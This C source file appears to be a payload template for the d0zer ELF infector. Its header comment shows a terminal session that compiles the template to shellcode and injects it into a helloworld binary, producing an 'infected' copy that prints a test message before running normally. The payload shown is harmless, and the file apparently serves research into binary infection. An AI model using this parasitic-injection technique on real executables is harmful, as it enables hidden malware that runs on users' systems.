/*
[sad0p@arch-deliberate d0zer-payloads]$ gcc -nostdlib -fno-stack-protector -fPIC example-test.c -o example-test
[sad0p@arch-deliberate d0zer-payloads]$ readelf -l example-test | more

Elf file type is DYN (Position-Independent Executable file)
Entry point 0x1000
There are 13 program headers, starting at offset 64

Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  PHDR           0x0000000000000040 0x0000000000000040 0x0000000000000040
                 0x00000000000002d8 0x00000000000002d8  R      0x8
  INTERP         0x0000000000000318 0x0000000000000318 0x0000000000000318
                 0x000000000000001c 0x000000000000001c  R      0x1
      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
  LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x00000000000003c9 0x00000000000003c9  R      0x1000
  LOAD           0x0000000000001000 0x0000000000001000 0x0000000000001000
                 0x00000000000000c4 0x00000000000000c4  R E    0x1000
  LOAD           0x0000000000002000 0x0000000000002000 0x0000000000002000
[sad0p@arch-deliberate d0zer-payloads]$ dd if=./example-test of=./payload.bin bs=1 skip=$((0x1000)) count=$((0xc4))
196+0 records in
196+0 records out
196 bytes copied, 0.000648461 s, 302 kB/s
[sad0p@arch-deliberate d0zer-payloads]$ ./shellcode.py 
./shellcode.py <file-payload.bin> <optional-ommit-last-n-bytes>
[sad0p@arch-deliberate d0zer-payloads]$ ./shellcode.py payload.bin 3
"\xb8\x00\x00\x00\x00\xe8\x08\x00\x00\x00\xe9\xb2\x00\x00\x00\x90\x0f\x0b\x55\x48\x89\xe5\x48\x83\xec\x20\x48\xb8\x4a\x75\x73\x74\x20\x61\x20\x74\x48\xba\x65\x73\x74\x20\x6d\x61\x6e\x20\x48\x89\x45\xe0\x48\x89\x55\xe8\xc7\x45\xf0\x21\x21\x0a\x00\x48\x8d\x45\xe0\x48\x89\xc7\xe8\x17\x00\x00\x00\x48\x89\xc2\x48\x8d\x45\xe0\x48\x89\xc6\xbf\x01\x00\x00\x00\xe8\x33\x00\x00\x00\x90\xc9\xc3\x55\x48\x89\xe5\x48\x89\x7d\xe8\x48\xc7\x45\xf8\x00\x00\x00\x00\xeb\x05\x48\x83\x45\xf8\x01\x48\x8b\x45\xe8\x48\x8d\x50\x01\x48\x89\x55\xe8\x0f\xb6\x00\x84\xc0\x75\xe8\x48\x8b\x45\xf8\x5d\xc3\x55\x48\x89\xe5\x89\x7d\xec\x48\x89\x75\xe0\x48\x89\x55\xd8\x48\xc7\xc0\x01\x00\x00\x00\x48\x8b\x7d\xec\x48\x8b\x75\xe0\x48\x8b\x55\xd8\x0f\x05\x48\x89\xc0\x48\x89\x45\xf8\x48\x8b\x45\xf8\x5d\xc3"
[sad0p@arch-deliberate d0zer-payloads]$ #last three bytes are garbage generated from the empty end_code function
[sad0p@arch-deliberate d0zer-payloads]$ #we ommit them from the output
[sad0p@arch-deliberate d0zer-payloads]$ export DOZEREGG="\xb8\x00\x00\x00\x00\xe8\x08\x00\x00\x00\xe9\xb2\x00\x00\x00\x90\x0f\x0b\x55\x48\x89\xe5\x48\x83\xec\x20\x48\xb8\x4a\x75\x73\x74\x20\x61\x20\x74\x48\xba\x65\x73\x74\x20\x6d\x61\x6e\x20\x48\x89\x45\xe0\x48\x89\x55\xe8\xc7\x45\xf0\x21\x21\x0a\x00\x48\x8d\x45\xe0\x48\x89\xc7\xe8\x17\x00\x00\x00\x48\x89\xc2\x48\x8d\x45\xe0\x48\x89\xc6\xbf\x01\x00\x00\x00\xe8\x33\x00\x00\x00\x90\xc9\xc3\x55\x48\x89\xe5\x48\x89\x7d\xe8\x48\xc7\x45\xf8\x00\x00\x00\x00\xeb\x05\x48\x83\x45\xf8\x01\x48\x8b\x45\xe8\x48\x8d\x50\x01\x48\x89\x55\xe8\x0f\xb6\x00\x84\xc0\x75\xe8\x48\x8b\x45\xf8\x5d\xc3\x55\x48\x89\xe5\x89\x7d\xec\x48\x89\x75\xe0\x48\x89\x55\xd8\x48\xc7\xc0\x01\x00\x00\x00\x48\x8b\x7d\xec\x48\x8b\x75\xe0\x48\x8b\x55\xd8\x0f\x05\x48\x89\xc0\x48\x89\x45\xf8\x48\x8b\x45\xf8\x5d\xc3"
[sad0p@arch-deliberate d0zer-payloads]$
[sad0p@arch-deliberate d0zer-payloads]$ ~/go/src/github.com/d0zer/d0zer -payloadEnv DOZEREGG -target ~/go/src/github.com/d0zer/experimental/helloworld -debug
[+] Maximum payload size 0xe9f for /home/sad0p/go/src/github.com/d0zer/experimental/helloworld
[+] Modifed entry point from 0x1040 to 0x1161
[+] Text segment starts @ 0x1000
[+] Text segment ends @ 0x1161
[+] Payload size pre-epilogue 0xd9
[+] Appended default restoration stub
[+] Generated and appended position independent return 2 OEP stub to payload
[+] Payload size post-epilogue 0x10f
------------------PAYLOAD----------------------------
00000000  54 50 51 53 52 56 57 55  41 50 41 51 41 52 41 53  |TPQSRVWUAPAQARAS|
00000010  41 54 41 55 41 56 41 57  b8 00 00 00 00 e8 08 00  |ATAUAVAW........|
00000020  00 00 e9 b2 00 00 00 90  0f 0b 55 48 89 e5 48 83  |..........UH..H.|
00000030  ec 20 48 b8 4a 75 73 74  20 61 20 74 48 ba 65 73  |. H.Just a tH.es|
00000040  74 20 6d 61 6e 20 48 89  45 e0 48 89 55 e8 c7 45  |t man H.E.H.U..E|
00000050  f0 21 21 0a 00 48 8d 45  e0 48 89 c7 e8 17 00 00  |.!!..H.E.H......|
00000060  00 48 89 c2 48 8d 45 e0  48 89 c6 bf 01 00 00 00  |.H..H.E.H.......|
00000070  e8 33 00 00 00 90 c9 c3  55 48 89 e5 48 89 7d e8  |.3......UH..H.}.|
00000080  48 c7 45 f8 00 00 00 00  eb 05 48 83 45 f8 01 48  |H.E.......H.E..H|
00000090  8b 45 e8 48 8d 50 01 48  89 55 e8 0f b6 00 84 c0  |.E.H.P.H.U......|
000000a0  75 e8 48 8b 45 f8 5d c3  55 48 89 e5 89 7d ec 48  |u.H.E.].UH...}.H|
000000b0  89 75 e0 48 89 55 d8 48  c7 c0 01 00 00 00 48 8b  |.u.H.U.H......H.|
000000c0  7d ec 48 8b 75 e0 48 8b  55 d8 0f 05 48 89 c0 48  |}.H.u.H.U...H..H|
000000d0  89 45 f8 48 8b 45 f8 5d  c3 41 5f 41 5e 41 5d 41  |.E.H.E.].A_A^A]A|
000000e0  5c 41 5b 41 5a 41 59 41  58 5d 5f 5e 5a 5b 59 58  |\A[AZAYAX]_^Z[YX|
000000f0  5c e8 14 00 00 00 48 2d  f6 00 00 00 48 2d 61 11  |\.....H-....H-a.|
00000100  00 00 48 05 40 10 00 00  ff e0 48 8b 04 24 c3     |..H.@.....H..$.|
--------------------END------------------------------
[+] Increased text segment p_filesz and p_memsz by 271 (length of payload)
[+] Adjusting segments after text segment file offsets by 0x1000
	Inceasing pHeader @ index 4 by 0x1000
	Inceasing pHeader @ index 5 by 0x1000
	Inceasing pHeader @ index 6 by 0x1000
	Inceasing pHeader @ index 10 by 0x1000
	Inceasing pHeader @ index 12 by 0x1000
[+] Increasing section header addresses if they come after text segment
[+] Extending section header entry for text section by payload len.
[+] (16) Updating sections past text section @ addr 0x2000
[+] (17) Updating sections past text section @ addr 0x2010
[+] (18) Updating sections past text section @ addr 0x2038
[+] (19) Updating sections past text section @ addr 0x3dd0
[+] (20) Updating sections past text section @ addr 0x3dd8
[+] (21) Updating sections past text section @ addr 0x3de0
[+] (22) Updating sections past text section @ addr 0x3fc0
[+] (23) Updating sections past text section @ addr 0x3fe8
[+] (24) Updating sections past text section @ addr 0x4008
[+] (25) Updating sections past text section @ addr 0x4018
[+] (26) Updating sections past text section @ addr 0x0
[+] (27) Updating sections past text section @ addr 0x0
[+] (28) Updating sections past text section @ addr 0x0
[+] (29) Updating sections past text section @ addr 0x0
[+] writing payload into the binary
[sad0p@arch-deliberate d0zer-payloads]$ ~/go/src/github.com/d0zer/experimental/helloworld-infected
Just a test man !!
hello world
[sad0p@arch-deliberate d0zer-payloads]$ ~/go/src/github.com/d0zer/experimental/helloworld
hello world
[sad0p@arch-deliberate d0zer-payloads]$
 */

#include <unistd.h>
#include <stdint.h>

#define STDOUT STDOUT_FILENO

long __write(int fd, const void *buf, size_t count);
size_t __strlen(const char *s);

extern unsigned long end_vx;
void real_start();

void __attribute__((naked)) _start()
{
	real_start();
	__asm__ __volatile__("jmp end_code");
}

/*
 * Your code can start in real_start. Additional functions are permitted, but they must be position independent.
 * Library functions will have to be rolled from syscall stubs you create.
 */
void real_start()
{
	char msg[] = "Just a test man !!\n";
	__write(STDOUT, msg, __strlen(msg));
}

/*
 * own libc strlen.
 */

size_t __strlen(const char *s)
{
	size_t len = 0;
	while(*s++ != '\0')
		len++;

	return len;
}

#define __load_syscall_ret(var) __asm__ __volatile__ ("mov %%rax, %0" : "=r" (var));
#define __write_syscall(type, name, arg1, arg1_type, arg2, arg2_type, arg3, arg3_type) \
	type name(arg1_type arg1, arg2_type arg2, arg3_type arg3) { \
		type ret; \
		__asm__ __volatile__ (\
				"movq $1, %%rax\n" \
				"movq %0, %%rdi\n" \
				"movq %1, %%rsi\n" \
				"movq %2, %%rdx\n" \
				"syscall" \
           			      : \
				      : "g" (arg1), "g" (arg2), "g" (arg3) \
				      : "%rax", "%rdi", "%rsi", "%rdx" \
		); \
		__load_syscall_ret(ret); \
		return ret; \
	}

__write_syscall(long, __write, fd, int, buf, const void *, count, size_t);
/*
 * No additional code beyond end_code(), d0zer appends a restoration stub here, unless you handle restoration
 * (transfering execution back to the non-parasitic code) with -noRestoration flag in d0zer.
 */
__attribute__((naked)) void end_code() {}
